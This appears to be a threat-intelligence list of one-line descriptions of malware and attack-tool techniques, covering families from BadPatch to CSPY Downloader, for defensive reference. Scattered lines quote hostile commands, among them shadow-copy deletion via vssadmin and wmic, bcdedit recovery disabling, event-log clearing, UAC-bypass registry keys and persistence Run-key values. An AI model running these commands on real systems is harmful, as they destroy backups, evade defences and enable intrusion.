BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information.
BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.
BadPatch uses HTTP for C2.
Bandook has modules that are capable of capturing audio.
Bandook was signed with valid Certum certificates.
Bandook can support commands to execute Java-based payloads.
Bandook can collect local files from the system .
Bandook has decoded its PowerShell script.
Bandook can upload files from a victim's machine over the C2 channel.
Bandook has a command to delete a file.
Bandook has a command to list files on a system.
Bandook can download files to the system.
Bandook contains keylogging capabilities.
Bandook has used lure documents to convince the user to enable macros.
Bandook has used the ShellExecuteW() function call.
Bandook has a command built in to use a raw TCP socket.
Bandook can detect USB devices.
Bandook has used PowerShell loaders as part of execution.
Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.
Bandook can support commands to execute Python-based payloads.
Bandook is capable of taking an image of and uploading the current desktop.
Bandook is delivered via a malicious Word document inside a zip file.
Bandook has used .PNG images within a zip file to build the executable.
Bandook has used AES encryption for C2 communication.
Bandook can collect information about the drives available on the system.
Bandook has a command to get the public IP address from a system.
Bandook has modules that are capable of capturing video from a victim's webcam.
Bandook has used malicious VBA code against the target system.
Bandook is capable of spawning a Windows command shell.
Bankshot recursively generates a list of files within a directory and sends them back to the control server.
Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.
Bankshot collects files from the local system.
Bankshot decodes embedded XOR strings.
Bankshot gathers domain and account names/information through process monitoring.
Bankshot exfiltrates data over its C2 channel.
Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.
Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.
Bankshot searches for files on the victim's machine.
Bankshot deletes all artifacts associated with the malware from the infected machine.
Bankshot uploads files and secondary payloads to the victim's machine.
Bankshot gathers domain and account names/information through process monitoring.
Bankshot writes data into the Registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj&lt;/code&gt;.
Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().
Bankshot encodes commands from the control server using a range of characters and gzip.
Bankshot binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.
Bankshot identifies processes and collects the process ids.
Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications.
Bankshot searches for certain Registry keys to be configured before executing the payload.
Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.
Bankshot modifies the time of a file as specified by the control server.
Bankshot uses HTTP for command and control communication.
Bankshot uses the command-line interface to execute arbitrary commands.
Bankshot can terminate a specific process by its process id.
Bazar can use TLS in C2 communications.
Bazar has been downloaded via Windows BITS functionality.
Bazar's loader can delete scheduled tasks created by a previous instance of the malware.
Bazar has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.
Bazar can retrieve information from the infected machine.
Bazar can decrypt downloaded payloads. Bazar also resolves strings and other artifacts at runtime.
Bazar has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.
Bazar has the ability to identify domain administrator accounts.
Bazar can implement DGA using the current date as a seed variable.
Bazar can use Nltest tools to obtain information about the domain.
The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe.
Bazar can hash then resolve API calls at runtime.
Bazar has used XOR, RSA2, and RC4 encrypted files.
Bazar has the ability to use an alternative C2 server if the primary server fails.
Bazar can delete its loader using a batch file in the Windows temporary folder.
Bazar can enumerate the victim's desktop.
Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.
Bazar can identify administrator accounts on an infected host.
Bazar can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.
Bazar can create a task named to appear benign.
The Bazar loader has named malicious shortcuts "adobe" and mimicked communications software.
The Bazar loader is used to download and execute the Bazar backdoor.
Bazar can use various APIs to allocate memory and facilitate code execution/injection.
Bazar can enumerate shared drives on the domain.
Bazar can execute a PowerShell script received from C2.
Bazar can identity the current process on a compromised host.
Bazar can inject into a target process using process doppelgänging.
Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing.
Bazar can inject code through calling &lt;code&gt;VirtualAllocExNuma&lt;/code&gt;.
Bazar can query &lt;code&gt;Windows\CurrentVersion\Uninstall&lt;/code&gt; for installed applications.
Bazar can create or add files to Registry Run Keys to establish persistence.
Bazar can enumerate remote systems using &lt;code&gt; Net View&lt;/code&gt;.
Bazar can create a scheduled task for persistence.
Bazar can identify the installed antivirus engine.
Bazar can establish persistence by writing shortcuts to the Windows Startup folder.
Bazar can query the Registry for installed applications.
Bazar has a variant with a packed payload.
Bazar has been spread via emails with embedded malicious links.
Bazar can send C2 communications with XOR encryption.
Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.
Bazar can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.
Bazar can collect the IP address and NetBIOS name of an infected machine.
Bazar can identify the username of the infected user.
Bazar can collect the time on the compromised host.
Bazar can use a timer to delay execution of core functionality.
Bazar can attempt to overload sandbox analysis by sending 1550 calls to &lt;code&gt;printf&lt;/code&gt;.
Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications.
Bazar downloads have been hosted on Google Docs.
Bazar can launch cmd.exe to perform reconnaissance commands.
Bazar can execute a WMI query to gather information about the installed antivirus engine.
Bazar can use Winlogon Helper DLL to establish persistence.
BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.
BendyBear has encrypted payloads using RC4 and XOR.
BendyBear is designed to download an implant from a C2 server.
BendyBear has used byte randomization to obscure its behavior.
BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.
BendyBear has used a custom RC4 and XOR encrypted protocol over port 443 for C2.
BendyBear can query the host's Registry key at &lt;code&gt;HKEY_CURRENT_USER\Console\QuickEdit&lt;/code&gt; to retrieve data.
BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.
BendyBear has the ability to determine local time on a compromised host.
BendyBear can check for analysis environments and signs of debugging using the Windows API &lt;code&gt;kernel32!GetTickCountKernel32&lt;/code&gt; call.
Bisonal has been loaded through a `.wll` extension added to the ` %APPDATA%\microsoft\word\startup\` repository.
Bisonal has appended random binary data to the end of itself to generate a large binary.
Bisonal has collected information from a compromised host.
Bisonal has decoded strings in the malware using XOR and RC4.
Bisonal has used a dynamic DNS service for C2.
Bisonal's DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.
Bisonal has added the exfiltrated data to the URL over the C2 channel.
Bisonal will delete its dropper and VBS scripts from the victim’s machine.
Bisonal can retrieve a file listing from the system.
Bisonal has the capability to download files to execute on the victim’s machine.
Bisonal has relied on users to execute malicious file attachments delivered via spearphishing emails.
Bisonal dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.
Bisonal has renamed malicious code to `msacm32.dll` to hide within a legitimate library; earlier versions were disguised as `winhelp`.
Bisonal has deleted Registry keys to clean up its prior activity.
Bisonal has used the Windows API to communicate with the Service Control Manager to execute a thread.
Bisonal has used raw sockets for network communication.
Bisonal can obtain a list of running processes on the victim’s machine.
Bisonal has supported use of a proxy server.
Bisonal has used the RegQueryValueExA function to retrieve proxy information in the Registry.
Bisonal has added itself to the Registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\&lt;/code&gt; for persistence.
Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: &lt;code&gt;HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”&lt;/code&gt;.
Bisonal has used the MPRESS packer and similar tools for obfuscation.
Bisonal has been delivered as malicious email attachments.
Bisonal has encoded binary data with Base64 and ASCII.
Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some Bisonal samples encrypt C2 communications with RC4.
Bisonal has used commands and API calls to gather system information.
Bisonal can execute &lt;code&gt;ipconfig&lt;/code&gt; on the victim’s machine.
Bisonal can check the system time set on the infected host.
Bisonal has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.
Bisonal can check to determine if the compromised system is running on VMware.
Bisonal's dropper creates VBS scripts on the victim’s machine.
Bisonal has used HTTP for C2 communications.
Bisonal has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.
Bisonal has been modified to be used as a Windows service.
BitPaymer can suppress UAC prompts by setting the &lt;code&gt;HKCU\Software\Classes\ms-settings\shell\open\command&lt;/code&gt; registry key on Windows 10 or &lt;code&gt;HKCU\Software\Classes\mscfile\shell\open\command&lt;/code&gt; on Windows 7 and launching the &lt;code&gt;eventvwr.msc&lt;/code&gt; process, which launches BitPaymer with elevated privileges.
BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending &lt;code&gt;.locked&lt;/code&gt; to the filename.
BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.
BitPaymer compares file names and paths to a list of excluded names and directory names during encryption.
BitPaymer attempts to remove the backup shadow files from the host using &lt;code&gt;vssadmin.exe Delete Shadows /All /Quiet&lt;/code&gt;.
BitPaymer can enumerate the sessions for each user logged onto the infected host.
BitPaymer can set values in the Registry to help in execution.
BitPaymer has copied itself to the &lt;code&gt;:bin&lt;/code&gt; alternate data stream of a newly created file.
BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including &lt;code&gt;RegEnumKeyW&lt;/code&gt;.
BitPaymer can search for network shares on the domain or workgroup using &lt;code&gt;net view &lt;host&gt;&lt;/code&gt;.
BitPaymer can use the RegEnumKeyW to iterate through Registry keys.
BitPaymer has set the run key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; for persistence.
BitPaymer can use &lt;code&gt;net view&lt;/code&gt; to discover remote systems.
BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem.
BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.
BitPaymer can use the tokens of users to create processes on infected systems.
BitPaymer can use &lt;code&gt;icacls /reset&lt;/code&gt; and &lt;code&gt;takeown /F&lt;/code&gt; to reset a targeted executable's permissions and then take ownership.
BitPaymer has attempted to install itself as a service to maintain persistence.
Black Basta had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.
The Black Basta dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.
Black Basta can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.
The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.
Black Basta can enumerate specific files for encryption.
Black Basta can delete shadow copies using vssadmin.exe.
Black Basta has set the desktop wallpaper on victims' machines to display a ransom note.
The Black Basta binary can use `chmod` to gain full permissions to targeted files.
Black Basta has been downloaded and executed from malicious Excel files.
Black Basta has established persistence by creating a new service named `FAX` after deleting the legitimate service by the same name.
The Black Basta dropper has mimicked an application for creating USB bootable drivers.
Black Basta can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files.
Black Basta has the ability to use native APIs for numerous functions including discovery and defense evasion.
Black Basta has used PowerShell scripts for discovery and to execute files over the network.
Black Basta can use LDAP queries to connect to AD and iterate over connected workstations.
Black Basta can reboot victim machines in safe mode with networking via `bcdedit /set safeboot network`.
Black Basta can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing.
Black Basta can enumerate volumes and collect system boot configuration and CPU information.
Black Basta can check whether the service name FAX is present.
Black Basta can make a random number of calls to the `kernel32.beep` function to hinder log analysis.
Black Basta can use `cmd.exe` to enable shadow copy deletion.
Black Basta has used WMI to execute files over the network.
Black Basta can create a new service to establish persistence.
BlackCat has the ability modify access tokens.
BlackCat can bypass UAC to escalate privileges.
BlackCat can clear Windows event logs using `wevtutil.exe`.
BlackCat has the ability to encrypt Windows devices, Linux devices, and VMWare instances.
BlackCat has the ability to wipe VM snapshots on compromised networks.
BlackCat can utilize `net use` commands to identify domain users.
BlackCat can determine if a user on a compromised host has domain admin privileges.
BlackCat can enumerate files for encryption.
BlackCat can delete shadow copies using `vssadmin.exe delete shadows /all /quiet` and `wmic.exe Shadowcopy Delete`; it can also modify the boot loader using `bcdedit /set {default} recoveryenabled No`.
BlackCat can change the desktop wallpaper on compromised hosts.
BlackCat can replicate itself across connected servers via `psexec`.
BlackCat has the ability to add the following registry key on compromised networks to maintain persistence: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services \LanmanServer\Paramenters`
BlackCat has the ability to discover network shares on compromised networks.
BlackCat can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.
BlackCat has the ability to stop VM services on compromised networks.
BlackCat can obtain the computer name and UUID, and enumerate local drives.
BlackCat can utilize `net use` commands to discover the user name on a compromised host.
BlackCat can execute commands on a compromised network with the use of `cmd.exe`.
BlackCat can use Windows commands such as `fsutil behavior set SymLinkEvaluation R2L:1` to redirect file system access to a different location after gaining access into compromised networks.
BlackCat can use `wmic.exe` to delete shadow copies on compromised networks.
BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.
The BlackEnergy component KillDisk is capable of deleting Windows Event Logs.
BlackEnergy has enabled the &lt;code&gt;TESTSIGNING&lt;/code&gt; boot configuration option to facilitate loading of a driver component.
BlackEnergy has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.
BlackEnergy has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.
BlackEnergy 2 contains a "Destroy" plug-in that destroys data stored on victim hard drives by overwriting file contents.
BlackEnergy injects its DLL component into svchost.exe.
BlackEnergy has the capability to communicate over a backup channel via plus.google.com.
BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.
BlackEnergy has removed the watermark associated with enabling the &lt;code&gt;TESTSIGNING&lt;/code&gt; boot configuration option by removing the relevant strings in the &lt;code&gt;user32.dll.mui&lt;/code&gt; of the system.
BlackEnergy has run a keylogger plug-in on a victim.
BlackEnergy has conducted port scans on a host.
BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry.
BlackEnergy has gathered a process list by using Tasklist.exe.
The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.
BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares.
BlackEnergy is capable of taking screenshots.
One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.
The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.
BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.
BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.
BlackEnergy has gathered information about local network connections using netstat.
BlackEnergy communicates with its C2 server over HTTP.
A BlackEnergy 2 plug-in uses WMI to gather victim host details.
One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name.
BlackMould can copy files on a compromised host.
BlackMould has the ability to find files on the targeted system.
BlackMould has the ability to download files to the victim's machine.
BlackMould can enumerate local drives on a compromised host.
BlackMould can send commands to C2 in the body of HTTP POST requests.
BlackMould can run cmd.exe with parameters.
BloodHound can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.
BloodHound can collect information about domain users, including identification of domain admin accounts.
BloodHound can collect information about domain groups and members.
BloodHound has the ability to map domain trusts and identify misconfigurations for potential abuse.
BloodHound has the ability to collect local admin information via GPO.
BloodHound can identify users with local administrator rights.
BloodHound can collect information about local groups and members.
BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.
BloodHound can collect password policy information on the target environment.
BloodHound can use PowerShell to pull Active Directory information from the target environment.
BloodHound can enumerate and collect the properties of domain computers, including domain controllers.
BloodHound can collect information on user sessions.
Bonadan can create bind and reverse shells on the infected system.
Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.
Bonadan can download additional modules from the C2 server.
Bonadan can use the &lt;code&gt;ps&lt;/code&gt; command to discover other cryptocurrency miners active on the system.
Bonadan can download an additional module which has a cryptocurrency mining extension.
Bonadan can XOR-encrypt C2 communications.
Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.
Bonadan can find the external IP address of the infected host.
Bonadan has discovered the username of the user running the backdoor.
BoomBox can decrypt AES-encrypted files downloaded from C2.
BoomBox has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.
BoomBox can execute an LDAP query to discover e-mail accounts for domain users.
BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found.
BoomBox can upload data to dedicated per-victim folders in Dropbox.
BoomBox can search for specific files and directories on a machine.
BoomBox has the ability to download next stage malware components to a compromised system.
BoomBox has gained execution through user interaction with a malicious file.
BoomBox has the ability to mask malicious data strings as PDF files.
BoomBox can encrypt data using AES prior to exfiltration.
BoomBox can establish persistence by writing the Registry value &lt;code&gt;MicroNativeCacheSvc&lt;/code&gt; to &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;.
BoomBox can use RunDLL32 for execution.
BoomBox can enumerate the hostname, domain, and IP of a compromised host.
BoomBox can enumerate the username on a compromised host.
BoomBox has used HTTP POST requests for C2.
BoomBox can download files from Dropbox using a hardcoded access token.
BoxCaon has used DropBox for C2 communications.
BoxCaon established persistence by setting the &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load&lt;/code&gt; registry key to point to its executable.
BoxCaon can upload files from a compromised host.
BoxCaon uploads files and data from a compromised host over the existing C2 channel.
BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.
BoxCaon has searched for files on the system, such as documents located in the desktop folder.
BoxCaon can download files.
BoxCaon has created a working folder for collected files that it sends to the C2 server.
BoxCaon has used Windows API calls to obtain information about the compromised host.
BoxCaon used the "StackStrings" obfuscation technique to hide malicious functionalities.
BoxCaon can collect the victim's MAC address by using the &lt;code&gt;GetAdaptersInfo&lt;/code&gt; API.
BoxCaon can execute arbitrary commands and utilize the "ComSpec" environment variable.
Brave Prince terminates antimalware processes.
Some Brave Prince variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.
Brave Prince gathers file and directory information from the victim’s machine.
Brave Prince lists the running processes.
Brave Prince gathers information about the Registry.
Brave Prince collects hard drive content and system configuration information.
Brave Prince gathers network configuration information as well as the ARP cache.
Briba downloads files onto infected hosts.
Briba creates run key Registry entries pointing to malicious DLLs dropped to disk.
Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.
Briba installs a service pointing to a malicious DLL dropped to disk.
Brute Ratel C4 has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.
Brute Ratel C4 has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.
Brute Ratel C4 can use DNS over HTTPS for C2.
Brute Ratel C4 has the ability to upload files from a compromised system.
Brute Ratel C4 has the ability to deobfuscate its payload prior to execution.
Brute Ratel C4 can use LDAP queries, `net group "Domain Admins" /domain` and `net user /domain` for discovery.
Brute Ratel C4 can use `net group` for discovery on targeted domains.
Brute Ratel C4 can use LDAP queries and `nltest /domain_trusts` for domain trust discovery.
Brute Ratel C4 can call and dynamically resolve hashed APIs.
Brute Ratel C4 has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).
Brute Ratel C4 can download files to compromised hosts.
Brute Ratel C4 can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.
Brute Ratel C4 has gained execution through users opening malicious documents.
Brute Ratel C4 has used Microsoft Word icons to hide malicious LNK files.
Brute Ratel C4 has used a payload file named OneDrive.update to appear benign.
Brute Ratel C4 can call multiple Windows APIs for execution, to share memory, and defense evasion.
Brute Ratel C4 can conduct port scanning against targeted systems.
Brute Ratel C4 has the ability to use TCP for external C2.
Brute Ratel C4 has used encrypted payload files and maintains an encrypted configuration structure in memory.
Brute Ratel C4 can enumerate all processes and locate specific process IDs (PIDs).
Brute Ratel C4 can use DNS over HTTPS for C2.
Brute Ratel C4 has used reflective loading to execute malicious DLLs.
Brute Ratel C4 has the ability to use RPC for lateral movement.
Brute Ratel C4 has the ability to use SMB to pivot in compromised networks.
Brute Ratel C4 can take screenshots on compromised hosts.
Brute Ratel C4 can detect EDR userland hooks.
Brute Ratel C4 can create Windows system services for execution.
Brute Ratel C4 can call `NtDelayExecution` to pause execution.
Brute Ratel C4 can use HTTPS and HTTPS for C2 communication.
Brute Ratel C4 can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.
Brute Ratel C4 can use cmd.exe for execution.
Brute Ratel C4 can use WMI to move laterally.
Brute Ratel C4 can use WinRM for pivoting.
Bumblebee can compress data stolen from the Registry and volume shadow copies prior to exfiltration.
Bumblebee can use asynchronous procedure call (APC) injection to execute commands received from C2.
Bumblebee has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.
Bumblebee can use a COM object to execute queries to gather system information.
Bumblebee can capture and compress stolen credentials from the Registry and volume shadow copies.
Bumblebee can search for tools used in static analysis.
Bumblebee can deobfuscate C2 server responses and unpack its code on targeted hosts.
The Bumblebee loader can support the `Dij` command which gives it the ability to inject DLLs into the memory of other processes.
Bumblebee can send collected data in JSON format to C2.
Bumblebee can use backup C2 servers if the primary server fails.
Bumblebee can uninstall its loader through the use of a `Sdl` command.
Bumblebee can download and execute additional payloads including through the use of a `Dex` command.
Bumblebee has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.
Bumblebee has relied upon a user downloading a file from a OneDrive link for execution.
Bumblebee has named component DLLs "RapportGP.dll" to match those used by the security company Trusteer.
Bumblebee can use multiple Native APIs.
Bumblebee has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.
Bumblebee can use `odbcconf.exe` to run DLLs on targeted hosts.
Bumblebee can use PowerShell for execution.
Bumblebee can identify processes associated with analytical tools.
Bumblebee can inject code into multiple processes on infected endpoints.
Bumblebee can check the Registry for specific keys.
Bumblebee has used `rundll32` for execution of the loader component.
Bumblebee can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.
Bumblebee can identify specific analytical tools based on running processes.
Bumblebee can use `LoadLibrary` to attempt to execute GdiPlus.dll.
Bumblebee has gained execution through luring users into opening malicious attachments.
Bumblebee has been spread through e-mail campaigns with malicious links.
Bumblebee has the ability to base64 encode C2 server responses.
Bumblebee can encrypt C2 requests and responses with RC4
Bumblebee has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.
Bumblebee can enumerate the OS version and domain on a targeted system.
Bumblebee has the ability to identify the user name.
Bumblebee has the ability to set a hardcoded and randomized sleep interval.
Bumblebee has the ability to perform anti-virtualization checks.
Bumblebee can create a Visual Basic script to enable persistence.
Bumblebee has been downloaded to victim's machines from OneDrive.
Bumblebee can use `cmd.exe` to drop and run files.
Bumblebee can use WMI to gather system information and to spawn processes for code injection.
Bundlore can use AppleScript to inject malicious JavaScript into a browser.
Bundlore can install malicious browser extensions that are used to hijack user searches.
Bundlore has used &lt;code&gt;openssl&lt;/code&gt; to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.
Bundlore can change browser security settings to enable extensions to be installed. Bundlore uses the &lt;code&gt;pkill cfprefsd&lt;/code&gt; command to prevent users from inspecting processes.
Bundlore has been spread through malicious advertisements on websites.
Bundlore uses the &lt;code&gt;curl -s -L -o&lt;/code&gt; command to exfiltrate archived data to a URL.
Bundlore prompts the user for their credentials.
Bundlore uses the &lt;code&gt;mktemp&lt;/code&gt; utility to make unique file and directory names for payloads, such as &lt;code&gt;TMP_DIR=`mktemp -d -t x&lt;/code&gt;.
Bundlore can download and execute new versions of itself.
Bundlore can execute JavaScript by injecting it into the victim's browser.
Bundlore can persist via a LaunchAgent.
Bundlore can persist via a LaunchDaemon.
Bundlore changes the permissions of a payload using the command &lt;code&gt;chmod -R 755&lt;/code&gt;.
Bundlore has attempted to get users to execute a malicious .app file that looks like a Flash Player update.
Bundlore has disguised a malicious .app file as a Flash Player update.
Bundlore has obfuscated data with base64, AES, RC4, and bz2.
Bundlore has used the &lt;code&gt;ps&lt;/code&gt; command to list processes.
Bundlore has used Python scripts to execute payloads.
Bundlore creates a new key pair with &lt;code&gt;ssh-keygen&lt;/code&gt; and drops the newly created user key in &lt;code&gt;authorized_keys&lt;/code&gt; to enable remote login.
Bundlore has the ability to enumerate what browser is being used as well as version information for Safari.
Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using &lt;code&gt;/usr/bin/sw_vers -productVersion&lt;/code&gt;.
Bundlore has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.
Bundlore uses HTTP requests for C2.
The CALENDAR malware communicates through the use of events in Google Calendar.
CALENDAR has a command to run cmd.exe to execute commands.
CARROTBALL has the ability to use FTP in C2 communications.
CARROTBALL has the ability to download and install a remote payload.
CARROTBALL has been executed through users being lured into opening malicious e-mail attachments.
CARROTBALL has used a custom base64 alphabet to decode files.
CARROTBAT has the ability to execute obfuscated commands on the infected host.
CARROTBAT has the ability to download a base64 encoded payload.
CARROTBAT has the ability to delete downloaded files from a compromised host.
CARROTBAT has the ability to download and execute a remote file via certutil.
CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.
CARROTBAT has the ability to execute command line arguments on a compromised host.
CCBkdr was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.
CCBkdr can use a DGA for Fallback Channels if communications with the primary command and control server are lost.
CHOPSTICK encrypts C2 communications with TLS.
CHOPSTICK is capable of performing remote command execution.
Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.
CHOPSTICK can use a DGA for Fallback Channels, domains are generated by concatenating words from lists.
CHOPSTICK can switch to a new C2 channel if the current one is broken.
An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.
CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.
CHOPSTICK is capable of performing remote file transmission.
CHOPSTICK used a proxy server between victims and the C2 server.
CHOPSTICK is capable of performing keylogging.
Various implementations of CHOPSTICK communicate with C2 over SMTP and POP3.
CHOPSTICK may modify Registry keys to store RC4 encrypted configuration information.
CHOPSTICK provides access to the Windows Registry, which can be used to gather information.
Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.
CHOPSTICK has the capability to capture screenshots.
CHOPSTICK checks for antivirus and forensics software.
CHOPSTICK encrypts C2 communications with RC4.
CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it.
Various implementations of CHOPSTICK communicate with C2 over HTTP.
COATHANGER connects to command and control infrastructure using SSL.
COATHANGER decodes configuration items from a bundled file for command and control activity.
COATHANGER copies the malicious file &lt;code&gt;/data2/.bd.key/preload.so&lt;/code&gt; to &lt;code&gt;/lib/preload.so&lt;/code&gt;, then launches a child process that executes the malicious file &lt;code&gt;/data2/.bd.key/authd&lt;/code&gt; as &lt;code&gt;/bin/authd&lt;/code&gt; with the arguments &lt;code&gt;/lib/preload.so reboot newreboot 1&lt;/code&gt;. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence.
COATHANGER is installed following exploitation of a vulnerable FortiGate device.
COATHANGER removes files from victim environments following use in multiple instances.
COATHANGER will survey the contents of system files during installation.
COATHANGER creates and installs itself to a hidden installation directory.
COATHANGER will remove and write malicious shared objects associated with legitimate system functions such as `read(2)`.
COATHANGER will create a daemon for timed check-ins with command and control infrastructure.
COATHANGER will set the GID of `httpsd` to 90 when infected.
COATHANGER uses ICMP for transmitting configuration information to and from its command and control server.
COATHANGER can store obfuscated configuration information in the last 56 bytes of the file `/date/.bd.key/preload.so`.
COATHANGER will query running process information to determine subsequent program execution flow.
COATHANGER includes a binary labeled `authd` that can inject a library into a running process and then hook an existing function within that process with a new function from that library.
COATHANGER hooks or replaces multiple legitimate processes and other functions on victim devices.
The first stage of COATHANGER is delivered as a packed file.
COATHANGER provides a BusyBox reverse shell for command and control.
COATHANGER uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.
CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated.
CORALDECK has exfiltrated data in HTTP POST headers.
CORALDECK searches for specified files.
CORESHELL contains unused machine instructions in a likely attempt to hinder analysis.
CORESHELL downloads another dropper from its C2 server.
CORESHELL can communicate over SMTP and POP3 for C2.
CORESHELL obfuscates strings using a custom stream cipher.
CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.
CORESHELL is installed via execution of rundll32 with an export named "init" or "InitW."
CORESHELL C2 messages are Base64-encoded.
CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.
CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.
CORESHELL can communicate over HTTP for C2.
CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.
CSPY Downloader has come signed with revoked certificates.
CSPY Downloader has the ability to self delete.
CSPY Downloader has the ability to remove values it writes to the Registry.
CSPY Downloader can download additional tools to a compromised host.
CSPY Downloader has been delivered via malicious documents with embedded macros.
CSPY Downloader has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.
